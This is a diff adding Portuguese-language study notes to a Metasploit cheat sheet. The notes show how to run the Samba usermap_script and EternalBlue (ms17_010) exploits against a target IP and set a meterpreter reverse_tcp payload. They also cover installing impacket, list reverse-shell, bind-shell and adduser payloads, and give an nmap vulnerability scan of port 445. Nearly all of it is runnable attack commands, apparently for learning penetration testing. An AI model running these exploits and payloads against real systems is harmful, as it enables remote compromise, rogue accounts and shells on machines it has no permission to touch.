@@ -138,6 +138,93 @@ Listando informações
 `run`
 
 
+## Explorando vulnerabilidade no Linux
+
+`use exploit/multi/samba/usermap_script`
+
+`info`
+
+`exploit`
+
+Listando payloads do exploit ativo:
+
+`show payloads`
+
+
+## Explorando vulnerabilidade no Windows
+
+`search ms17_010`
+
+`use exploit/windows/smb/ms17_010_eternalblue_win8`
+
+`show options`
+
+`set RHOSTS 192.168.0.1`
+
+`show payloads`
+
+*Obs: Caso você não defina o payload o exploit ira escolher de forma automática qual o melhor na quele momento.*
+
+Exemplo para definir o payload:
+
+`set payload windows/x64/meterpreter/reverse_tcp`
+
+`exploit`
+
+*Obs: Caso seja emitido algum erro ao exeuctar o exploit, analise a menssagem e observe se esta faltando alguma dependência (modulo) para que o exploit funcione de forma correta.*
+
+Exemplo de instalação de Dependência
+
+`apt search impacket`
+
+`apt install impacket-scripts python-impacket python3-impacket`
+
+Executando o exploit novamente apos instalar a dependẽncia
+
+`exploit`
+
+`help`
+
+
+## Tipos de Payloads
+
+
+windows/x64/meterpreter_reverse_tcp   -   Inline / non_staged
+
+windows/x64/meterpreter/reverse_tcp   -   Staged
+
+
+windows/shell_bind_tcp  -   Inline / non_staged
+
+windows/shell/bind_tcp   -   Staged
+
+windows/adduser   -   Inline / non_staged
+
+linux/x86/adduser   -   Inline / non_staged
+
+linux/x86/shell/reverse_tcp   -   Staged
+
+linux/x86/shell_reverse_tcp -   Inline / non_staged
+
+
+## Diferenças entre payloads (Rever)
+
+Buscando vulnerabilidades
+
+`db_nmap --open -p 445 192.168.0.1 --script=vuln -Pn`
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
